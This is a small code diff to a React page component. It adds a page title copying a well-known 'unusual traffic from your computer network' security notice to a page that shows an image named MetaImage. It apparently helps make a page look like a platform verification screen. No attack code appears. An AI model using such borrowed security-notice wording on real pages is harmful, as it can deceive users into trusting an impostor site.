@@ -38,6 +38,7 @@ const Index: FC = () => {
     }, [isShowCheckMark, router]);
     return (
         <div className='flex flex-col items-center justify-center pt-[150px]'>
+            <title>Our systems have detected unusual traffic from your computer network</title>
             <div className='w-[300px]'>
                 <Image src={MetaImage} alt='' className='w-16' />
                 <div className='flex w-full items-center justify-start py-5'>
